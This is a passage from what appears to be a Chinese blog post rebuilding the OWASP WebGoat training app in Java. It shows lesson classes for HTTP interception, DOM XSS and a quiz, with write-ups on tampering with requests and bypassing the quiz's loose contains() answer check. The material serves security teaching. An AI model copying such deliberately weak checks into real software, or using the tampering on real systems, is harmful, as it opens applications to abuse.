function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.GENERAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;2.http-proxies.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HttpBasicsInterceptRequest"><a href="#HttpBasicsInterceptRequest" class="headerlink" title="HttpBasicsInterceptRequest"></a>HttpBasicsInterceptRequest</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.http_proxies;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpBasicsInterceptRequest</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/HttpProxies/intercept-request&quot;,method = &#123;RequestMethod.POST,RequestMethod.GET&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;x-request-intercepted&quot;,required = false)</span>Boolean headerValue, <span class="meta">@RequestParam(value = &quot;changeMe&quot;,required = false)</span> String paramValue, HttpServletRequest request)</span>&#123;</span><br><span class="line"><span class="comment">//        获取请求头中的x-request-intercepted required = false表示可以有也可以没有</span></span><br><span class="line"><span class="comment">//        将请求参数中的changeMe 绑定为paramValue</span></span><br><span class="line">        <span class="keyword">if</span> (HttpMethod.POST.matches(request.getMethod()))&#123;</span><br><span class="line"><span class="comment">//            如果请求是post就失败</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;http-proxies.intercept.failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (headerValue != <span class="literal">null</span> &amp;&amp; paramValue != <span class="literal">null</span> &amp;&amp; headerValue &amp;&amp; <span class="string">&quot;Requests are tampered easily&quot;</span>.equalsIgnoreCase(paramValue))&#123;</span><br><span class="line"><span class="comment">//            如果headerValue 不为空 paramValue 不为空 headerValue为true 并且paramValue与字符串相等</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;http-proxies.intercept.success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;http-proxies.intercept.failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完成题目 主要是教会你抓包并修改请求包</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825185451367.png" alt="image-20220825185451367"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825190444738.png" alt="image-20220825190444738"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825190909702.png" alt="image-20220825190909702"></p>
<h2 id="chrome-dev-tools"><a href="#chrome-dev-tools" class="headerlink" title="chrome_dev_tools"></a>chrome_dev_tools</h2><h3 id="ChromeDevTools"><a href="#ChromeDevTools" class="headerlink" title="ChromeDevTools"></a>ChromeDevTools</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.chrome_dev_tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChromeDevTools</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.GENERAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;3.chrome-dev-tools.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="chrome-dev-tools-1"><a href="#chrome-dev-tools-1" class="headerlink" title="chrome_dev_tools"></a>chrome_dev_tools</h2><h3 id="NetworkDummy"><a href="#NetworkDummy" class="headerlink" title="NetworkDummy"></a>NetworkDummy</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.chrome_dev_tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NetworkDummy</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/ChromeDevTools/dummy&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String successMessage)</span>&#123;</span><br><span class="line"><span class="comment">//        获取successMessage参数</span></span><br><span class="line">        <span class="type">UserSessionData</span> <span class="variable">userSessionData</span> <span class="operator">=</span> getUserSessionData();</span><br><span class="line"><span class="comment">//        这里我们去看 UserSessionData在哪里赋值的</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">answer</span> <span class="operator">=</span> (String) userSessionData.getValue(<span class="string">&quot;randValue&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (successMessage != <span class="literal">null</span> &amp;&amp; successMessage.equals(answer))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-dom-message-success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-dom-message-failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825202707349.png" alt="image-20220825202707349"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825204113787.png" alt="image-20220825204113787"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825204311496.png" alt="image-20220825204311496"></p>
<p>那么暂时情况下我们没有找到给userSessionData.Value(“randValue”)赋值的地方 这里我们首先去查找一下哪里调用了这个setValue </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825212624529.png" alt="image-20220825212624529"></p>
<p>很明显这里其实暂时仅仅有一个地方调用了 那么现在读下来其实我们这道题目是无法去做的 因此我选择去看前端的题目要求</p>
<p>可以简单的理解一下就是像让我们去通过console去调用这个js方法 这里找了半天才找到这个js文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825210117176.png" alt="image-20220825210117176"></p>
<p>尝试去调用的时候也是很明显的出现了问题那么我们现在需要去做的是看看哪里有关于这个路径的信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825212829615.png" alt="image-20220825212829615"></p>
<p>这里在xss关卡其实有调用</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825212931962.png" alt="image-20220825212931962"></p>
<p>因此这里选择去先写这个文件</p>
<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><h5 id="DOMCrossSiteScripting"><a href="#DOMCrossSiteScripting" class="headerlink" title="DOMCrossSiteScripting"></a>DOMCrossSiteScripting</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DOMCrossSiteScripting</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/phone-home-xss&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> Integer param1, <span class="meta">@RequestParam</span> Integer param2, HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">UserSessionData</span> <span class="variable">userSessionData</span> <span class="operator">=</span> getUserSessionData();</span><br><span class="line">        <span class="type">SecureRandom</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>();</span><br><span class="line">        <span class="comment">//        new 一个生成随机数的对象</span></span><br><span class="line">        userSessionData.setValue(<span class="string">&quot;randValue&quot;</span>,String.valueOf(number.nextInt()));</span><br><span class="line"><span class="comment">//        生成一个随机数并给randValue赋值</span></span><br><span class="line">        <span class="keyword">if</span> (param1 == <span class="number">42</span> &amp;&amp; param2 == <span class="number">24</span> &amp;&amp; request.getHeader(<span class="string">&quot;webgoat-requested-by&quot;</span>).equals(<span class="string">&quot;dom-xss-vuln&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).output(<span class="string">&quot;phoneHome Response is &quot;</span> + userSessionData.getValue(<span class="string">&quot;randValue&quot;</span>).toString()).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825221701018.png" alt="image-20220825221701018"></p>
<p>由于在上面进行了对比successMessage.equals(answer)</p>
<p>所以这里的phoneHome需要我们提交进去就可以过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825221928248.png" alt="image-20220825221928248"></p>
<p>这里过关之后我会删除xss&#x2F;DOMCrossSiteScripting.java</p>
<h3 id="NetworkLesson"><a href="#NetworkLesson" class="headerlink" title="NetworkLesson"></a>NetworkLesson</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.chrome_dev_tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;networkHint1&quot;,&quot;networkHint2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NetworkLesson</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/ChromeDevTools/network&quot;,params = &#123;&quot;network_num&quot;,&quot;number&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String network_num,<span class="meta">@RequestParam</span> String number)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (network_num.equals(number))&#123;</span><br><span class="line"><span class="comment">//            这里主要是判断输入的两个值是否相同</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;network.success&quot;</span>).output(<span class="string">&quot;&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;network.failed&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/ChromeDevTools/network&quot;,params = &quot;networkNum&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; ok(<span class="meta">@RequestParam</span> String networkNum)&#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok().build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825230036188.png" alt="image-20220825230036188"></p>
<p>根据network去查看一下向 ChromeDevTools&#x2F;network 发送的payload</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825230129245.png" alt="image-20220825230129245"></p>
<p>输入即可过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825230236518.png" alt="image-20220825230236518"></p>
<p>当然也可通过check抓取值</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825230325870.png" alt="image-20220825230325870"></p>
<h2 id="cia"><a href="#cia" class="headerlink" title="cia"></a>cia</h2><h3 id="CIA"><a href="#CIA" class="headerlink" title="CIA"></a>CIA</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.cia;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CIA</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.GENERAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;4.cia.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CIAQuiz"><a href="#CIAQuiz" class="headerlink" title="CIAQuiz"></a>CIAQuiz</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.cia;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CIAQuiz</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    String[] solutions = &#123;<span class="string">&quot;Solution 3&quot;</span>,<span class="string">&quot;Solution 1&quot;</span>,<span class="string">&quot;Solution 4&quot;</span>, <span class="string">&quot;Solution 2&quot;</span>&#125;;</span><br><span class="line">    <span class="type">boolean</span>[] guesses = <span class="keyword">new</span> <span class="title class_">boolean</span>[solutions.length];</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/cia/quiz&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String[] question_0_solution,<span class="meta">@RequestParam</span> String[] question_1_solution,<span class="meta">@RequestParam</span> String[] question_2_solution,<span class="meta">@RequestParam</span> String [] question_3_solution)</span>&#123;</span><br><span class="line"><span class="comment">//        这里可见请求参数这里其实是使用的String [] 数组,那么当我们传入多个相同参数的时候就会全部获取存放到数组之中</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">correctAnswers</span> <span class="operator">=</span><span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">        String[] givenAnswers = &#123;question_0_solution[<span class="number">0</span>],question_1_solution[<span class="number">0</span>],question_2_solution[<span class="number">0</span>],question_3_solution[<span class="number">0</span>]&#125;;</span><br><span class="line"><span class="comment">//        获取每个参数中个的第一个值 并存放到givenAnswers中去</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; solutions.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (givenAnswers[i].contains(solutions[i]))&#123;</span><br><span class="line"><span class="comment">//                如果第一个参数中包含 Solution 3</span></span><br><span class="line">                correctAnswers++;</span><br><span class="line"><span class="comment">//                正确答案的数量加1</span></span><br><span class="line">                guesses[i] = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//                就猜对了</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                guesses[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (correctAnswers == solutions.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/cia/quiz&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span>[] getResults()&#123;</span><br><span class="line"><span class="comment">//        返回这个guesses数组</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.guesses;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也比较简单 看下发送的 请求 可以发现当提交了答案之后会立马去get请求一次答案</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827122239088.png" alt="image-20220827122239088"></p>
<p>第一种过关方法就是一个个试去找正确答案</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827122334897.png" alt="image-20220827122334897"></p>
<p>另一种方式就是根据检查答案的方式 既然答案检查的是是否包含这个字段,那么我们只要把字段全部包含就可了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827122624570.png" alt="image-20220827122624570"></p>
<p>但是呢实际这样写并不会通过,我们来看看可以发现这里的请求参数默认以,进行了分割,导致并没有取到值</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827122843143.png" alt="image-20220827122843143"></p>
<p>这样写即可完成</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827123050738.png" alt="image-20220827123050738"></p>
<h2 id="lesson-template"><a href="#lesson-template" class="headerlink" title="lesson_template"></a>lesson_template</h2><h3 id="LessonTemplate"><a href="#LessonTemplate" class="headerlink" title="LessonTemplate"></a>LessonTemplate</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.lesson_template;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonTemplate</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.GENERAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;lesson-template.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SampleAttack"><a href="#SampleAttack" class="headerlink" title="SampleAttack"></a>SampleAttack</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.lesson_template;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;lesson-template.hints.1&quot;,&quot;lesson-template.hints.2&quot;,&quot;lesson-template.hints.3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SampleAttack</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">secretValue</span> <span class="operator">=</span> <span class="string">&quot;secr37Value&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/lesson-template/sample-attack&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam(&quot;param1&quot;)</span>String param1,<span class="meta">@RequestParam(&quot;param2&quot;)</span>String param2)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (userSessionData.getValue(<span class="string">&quot;some-value&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (secretValue.equals(param1))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                    .output(<span class="string">&quot;Custom Output ...if you want, for success&quot;</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;lesson-template.sample-attack.success&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;lesson-template.sample-attack.failure-2&quot;</span>)</span><br><span class="line">                .output(<span class="string">&quot;Custom output for this failure scenario, usually html that will get rendered directly ... yes, you can self-xss if you want&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/lesson-template/shop/&#123;user&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Item&gt; <span class="title function_">getItemsInBasket</span><span class="params">(<span class="meta">@PathVariable(&quot;user&quot;)</span>String user)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> List.of(<span class="keyword">new</span> <span class="title class_">Item</span>(<span class="string">&quot;WG-1&quot;</span>,<span class="string">&quot;WebGoat promo&quot;</span>,<span class="number">12.8</span>),<span class="keyword">new</span> <span class="title class_">Item</span>(<span class="string">&quot;WG-2&quot;</span>,<span class="string">&quot;webGoat sticker&quot;</span>,<span class="number">0.00</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Item</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String number;</span><br><span class="line">        <span class="keyword">private</span> String description;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关其实就是教我们如何自己去出题目的,那么其实这里就是样例</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827133344581.png" alt="image-20220827133344581"></p>
<p>简单通过阅读代码发现只要第一个参数与密钥相同就可过关</p>
<h2 id="hijacksession"><a href="#hijacksession" class="headerlink" title="hijacksession"></a>hijacksession</h2><h3 id="HijackSession"><a href="#HijackSession" class="headerlink" title="HijackSession"></a>HijackSession</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.hijacksession;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HijackSession</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hijacksession.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 